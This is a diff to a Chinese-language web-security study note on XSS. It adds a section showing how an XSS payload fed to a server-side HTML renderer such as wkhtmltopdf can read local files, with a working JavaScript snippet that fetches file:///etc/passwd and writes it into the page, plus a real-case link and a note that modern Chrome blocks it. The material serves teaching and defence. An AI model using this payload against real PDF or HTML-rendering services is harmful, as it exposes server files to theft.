@@ -406,8 +406,43 @@ XSS proxy - 与XSS受害者的浏览器实时交互.  工具 [JShell](https://gi
 * 获取录音数据 - (HTML5) 需要授权 Recording Audio
 * 获取摄像数据 - (HTML5) 需要授权 webcam
 * 获取地理位置 - (HTML5) 需要授权 访问受害者的Geo-location
-* 结合具体功能 - 通过“动态生成PDF”功能的XSS 通过XMLHTTPRequest对`file://`协议发起异步请求 读取本地文件内容 [Local File Read via XSS in Dynamically Generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
+* 读取本地文件
 * ...
+
+
+#### XSS利用方式 - 读取本地文件
+
+* 利用条件:web后端使用了"没做好跨域防御"的html解析库(如html解析库[wkhtmltopdf](https://github.com/wkhtmltopdf/wkhtmltopdf))；并且该html解析库的输入(html代码)用户可控
+* 利用过程:
+  * 构造1.html文件(包含如下JavaScript代码)
+  * 把1.html作为输入 使html解析库解析该html文件`file:///tmp/1.html`
+  * 解析html文档必然有解析JavaScript过程:
+    * 创建`XMLHTTPRequest`对象
+    * 使用该对象`.open`函数 初始化一个新的request(默认异步)
+    * 再使用该对象的`.send`函数 发送该request去读取`file://`域下的另一文件`file:///etc/passwd`
+    * 因为该解析库没做好跨域防御 所以该request的响应内容就是文件`/etc/passwd`的内容
+    * 使用`document.write`将该request的响应内容(文件内容)写入`document`
+  * 真实案例 [Local File Read via XSS in Dynamically Generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html) 
+
+
+```
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open("GET","file:///etc/passwd");
+x.send();
+</script>
+```
+
+```
+补充:现代浏览器中当然做了严格的跨域限制 在`file://`域下无法读取其他文件
+如Chrome (版本 78.0.3904.97)
+
+Access to XMLHttpRequest at 'file:///etc/passwd' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, chrome, chrome-extension, https.
+```
+
 
 ### SDL - 防御与修复方案
 
